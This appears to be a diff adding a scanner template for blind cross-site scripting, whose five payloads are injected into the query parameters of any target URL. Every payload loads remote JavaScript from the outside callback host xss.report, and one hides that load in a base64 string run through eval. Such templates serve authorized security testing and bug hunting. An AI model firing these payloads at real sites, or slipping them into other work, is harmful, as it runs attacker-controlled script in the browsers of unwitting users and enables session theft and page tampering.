@@ -1,0 +1,27 @@
+id: fuzz-blind-xss-2
+
+info:
+  name: Blind Cross Site Scripting
+  author: otterly
+  severity: medium
+  tags: xss,bxss,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      payload:
+        - "`'\"><script src=//xss.report/c/hnterx></script>"
+        - "`'\"></script></title></textarea><script src=//xss.report/c/hnterx></script>"
+        - "--></tiTle></stYle></texTarea></scrIpt>\"//'//><scrIpt src=\"https://xss.report/c/hnterx\"></scrIpt>"
+        - "`'\"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''\"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7='))//"
+        - "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://xss.report/c/hnterx\"></scrIpt>"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{payload}}"
